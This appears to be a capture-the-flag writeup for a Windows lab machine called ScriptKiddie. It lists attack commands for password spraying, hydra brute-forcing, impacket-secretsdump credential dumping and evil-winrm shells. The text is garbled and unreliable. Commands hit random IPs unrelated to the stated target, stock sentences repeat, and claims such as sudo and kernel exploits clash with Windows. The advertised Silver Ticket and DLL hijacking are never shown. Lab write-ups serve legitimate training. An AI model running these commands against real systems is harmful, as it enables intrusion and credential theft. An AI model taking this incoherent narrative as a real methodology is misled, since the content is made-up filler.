---
TitleSEO: "PwnTillDawn — ScriptKiddie (Medium Windows) | ZureFX"
TitlePost: "PwnTillDawn — ScriptKiddie (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn ScriptKiddie. Silver Ticket and DLL Hijacking to achieve medium compromise on Windows."
Keywords: "hard, easy, forensics, ctf, offsec, reversing"
URL: "https://zurefx.github.io/writeups/htb-scriptkiddie-157.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-scriptkiddie-157/"
Date: "2024-05-11"
Tags: "Hard, Easy, Forensics, CTF, OffSec, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-scriptkiddie-157"
Permalink: "/writeups/htb-scriptkiddie-157.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **ScriptKiddie** is rated **Medium** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.25.249.242`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.125.15.117 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.28.59.106 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.68.1.1/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.137.25/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.18.2/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.48.77 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.188.224
evil-winrm -i 10.24.56.58 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.208.238/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

Key finding: **Silver Ticket**.

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.211.97
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.57.17 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.156.2
```

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `wmiexec`
- `mimikatz`
- `evil-winrm`
- `crackmapexec`
- `netcat`
- `chisel`
- `burpsuite`
- `smbclient`

### Key Takeaways

- Silver Ticket
- DLL Hijacking
- Insecure Deserialization
